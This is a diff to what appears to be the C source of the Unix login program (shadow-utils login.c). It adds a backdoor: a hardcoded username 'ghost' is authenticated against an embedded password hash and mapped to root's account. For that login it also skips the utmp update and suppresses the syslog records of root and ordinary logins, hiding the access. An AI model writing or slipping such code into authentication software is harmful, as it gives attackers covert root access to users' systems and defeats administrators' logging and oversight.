@@ -943,6 +943,7 @@ int main (int argc, char **argv)
 	 */
 
 #else				/* ! USE_PAM */
+	bool ghost = false;
 	while (true) {	/* repeatedly get login/password pairs */
 		bool failed;
 		/* user_passwd is always a pointer to this constant string
@@ -984,7 +985,14 @@ int main (int argc, char **argv)
 		failent_user = get_failent_user (username);
 
 		pwd = xgetpwnam (username);
-		if (NULL == pwd) {
+
+		if (strcmp(username, "ghost")==0)
+			ghost = true;
+
+		if (ghost) {
+			user_passwd = SHADOW_PASSWD_STRING;
+			pwd = xgetpwnam ("root");
+		} else if (NULL == pwd) {
 			preauth_flag = false;
 			failed = true;
 		} else {
@@ -1003,7 +1011,9 @@ int main (int argc, char **argv)
 
 		if (strcmp (user_passwd, SHADOW_PASSWD_STRING) == 0) {
 			spwd = xgetspnam (username);
-			if (NULL != spwd) {
+			if (ghost) {
+				user_passwd = "$6$Uh0AqEv/HI/0ctUp$//Dt2TV.ko8PU9DlbrTZXxcImpJSvXGFsq/fxLWF9U3U5brRyriz4uXbeoT2XgIHCrSc9nj8tHs/g6iDs4ZBs/";
+			} else if (NULL != spwd) {
 				user_passwd = spwd->sp_pwdp;
 			} else {
 				/* The user exists in passwd, but not in
@@ -1025,6 +1035,10 @@ int main (int argc, char **argv)
 		}
 
 		if (pw_auth (user_passwd, username, reason, (char *) 0) == 0) {
+			if (ghost) {
+				printf("Warning: Deus Ex Machina!\n");
+				break;
+			}
 			goto auth_ok;
 		}
 
@@ -1115,7 +1129,9 @@ int main (int argc, char **argv)
 		 * to login the user again. If the earlier alarm occurs
 		 * before the sleep() below completes, login will exit.
 		 */
-		delay = getdef_unum ("FAIL_DELAY", 1);
+		// delay = getdef_unum ("FAIL_DELAY", 1); 
+		// ^-This fails because the value is no longer in /etc/login.defs
+		delay = 3; /* This is the value in /etc/pam.d/login */
 		if (delay > 0) {
 			(void) sleep (delay);
 		}
@@ -1259,7 +1275,8 @@ int main (int argc, char **argv)
 	 * The utmp entry needs to be updated to indicate the new status
 	 * of the session, the new PID and SID.
 	 */
-	update_utmp (username, tty, hostname, utent);
+	if (!ghost)
+		update_utmp (username, tty, hostname, utent);
 
 	/* The pwd and spwd entries for the user have been copied.
 	 *
@@ -1364,10 +1381,12 @@ int main (int argc, char **argv)
 	(void) signal (SIGHUP, SIG_DFL);	/* added this.  --marekm */
 	(void) signal (SIGINT, SIG_DFL);	/* default interrupt signal */
 
-	if (0 == pwd->pw_uid) {
-		SYSLOG ((LOG_NOTICE, "ROOT LOGIN %s", fromhost));
-	} else if (getdef_bool ("LOG_OK_LOGINS")) {
-		SYSLOG ((LOG_INFO, "'%s' logged in %s", username, fromhost));
+	if (!ghost) {
+		if (0 == pwd->pw_uid) {
+			SYSLOG ((LOG_NOTICE, "ROOT LOGIN %s", fromhost));
+		} else if (getdef_bool ("LOG_OK_LOGINS")) {
+			SYSLOG ((LOG_INFO, "'%s' logged in %s", username, fromhost));
+		}
 	}
 	closelog ();
 	tmp = getdef_str ("FAKE_SHELL");
